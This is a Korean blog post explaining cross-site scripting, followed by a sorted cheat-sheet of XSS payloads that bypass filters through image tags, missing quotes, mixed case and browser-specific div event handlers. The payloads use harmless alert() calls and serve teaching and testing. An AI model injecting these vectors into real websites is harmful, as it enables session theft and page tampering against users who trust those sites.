---
layout: post
title: XSS(Cross-site Scripting) 공격에 대하여
---

오늘은 XSS(*Cross-site Scripting*)에 대해 알아보자.

## XSS란?

XSS는 일종의 Injection 공격으로, 웹사이트 보안이 취약한 부분에 주로 자바스크립트 코드를 삽입하여 특정 사람들의 정보를 빼가는 것을 노리는 공격이다. 하지만 XSS는 방어하기 어렵고 4년마다 한 번씩 출간되는 [OWASP Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project#Translation_Efforts_2)에도 계속 올라온다.

그렇다면 XSS는 왜 방어하기 어려울까? 그 이유는 브라우저가 자바스크립트 코드를 실행할 수 있고, 사용자들이 브라우저로 신뢰하고 있는 웹사이트를 돌아다닐 때 해당 페이지에서 악의적인 코드가 문제없이 실행될 수 있기 때문이다. 결국, 피해자의 브라우저에서 공격자에 의해 스크립트를 실행시켜 사용자 세션을 탈취할 수 있게 만들고, 웹사이트를 변조시켜 악성 사이트로 리다이렉션할 수 있도록 만든다.

XSS 공격을 막으려면 웹 페이지 입력 폼에서 올바른 유효성 검사 또는 필터링 처리 기능을 추가하고, 신뢰할 수 없는 데이터를 포함하지 않아야 한다.

## XSS Scripts

그렇다면 XSS 공격 스크립트들은 어떤 것이 있는지 알아보자. 공격자가 어떤 스크립트를 웹 페이지에 삽입하는지 확인할 수 있다.

### 기본적인 필터링이 없을 경우
```html
<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
<script>alert(123)</script>
<script>alert("hellox worldss");</script>
```

### 이미지 태그를 이용한 경우
```html
<IMG SRC="javascript:alert('XSS');">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<img src="javascript:alert('XSS');">
<img src=javascript:alert(&quot;XSS&quot;)>
<picture><source srcset="x"><img onerror="alert(1)"></picture>
<picture><img srcset="x" onerror="alert(1)"></picture>
<img srcset=",,,,,x" onerror="alert(1)">
```

### 따옴표(*Quotes*), 세미콜론(*Semicolon*)이 없는 경우
```html
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
```

### 대소문자 구별이 없는 경우
```html
<IMG SRC=JaVaScRiPt:alert('XSS')>
```

### <script> 태그를 사용하지 않는 경우
```html
<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
<video poster=javascript:alert(1)//></video>
<body oninput=alert(1)><input autofocus>
<? foo="><script>alert(1)</script>">
<! foo="><script>alert(1)</script>">
</ foo="><script>alert(1)</script>">
<? foo="><x foo='?><script>alert(1)</script>'>">
<! foo="[[[Inception]]"><x foo="]foo><script>alert(1)</script>">
<% foo><x foo="%><script>alert(123)</script>">
```

### <div> 태그를 사용한 경우(각 브라우저 별로 정리)
```html
<!-- Chrome, Opera, Safari and Edge -->
<div onfocus="alert(1)" contenteditable tabindex="0" id="xss"></div>
<div style="-webkit-user-modify:read-write" onfocus="alert(1)" id="xss">
<div style="-webkit-user-modify:read-write-plaintext-only" onfocus="alert(1)" id="xss">

<!-- Firefox -->
<div onbeforescriptexecute="alert(1)"></div>
<script>1</script>

<!-- IE10/11 & Edge -->
<div style="-ms-scroll-limit:1px;overflow:scroll;width:1px" onscroll="alert(1)">

<!-- IE10 -->
<div contenteditable onresize="alert(1)"></div>

<!-- IE11 -->
<div onactivate="alert(1)" id="xss" style="overflow:scroll"></div>
<div onfocus="alert(1)" id="xss" style="display:table">
<div id="xss" style="-ms-block-progression:bt" onfocus="alert(1)">
<div id="xss" style="-ms-layout-flow:vertical-ideographic" onfocus="alert(1)">
<div id="xss" style="float:left" onfocus="alert(1)">

<!-- Chrome, Opera, Safari -->
<style>@keyframes x{}</style>
<div style="animation-name:x" onanimationstart="alert(1)"></div>

<!-- Chrome, Opera, Safari -->
<style>
div {width: 100px;}
div:target {width: 200px;}
</style>
<div id="xss" onwebkittransitionend="alert(1)" style="-webkit-transition: width .1s;"></div>

<!-- Safari -->
<div style="overflow:-webkit-marquee" onscroll="alert(1)"></div>
```

나중에 기회가 된다면 sqlmap같은 도구를 XSS 취약점 점검 도구 버전으로 개발해보고 싶다. xssmap? 사실 사람들이 개인적으로 만든 퍼저(*Fuzzer*)들이 많지만, 플랫폼 또는 언어를 통합할 수 있다면 좋을 것 같다.
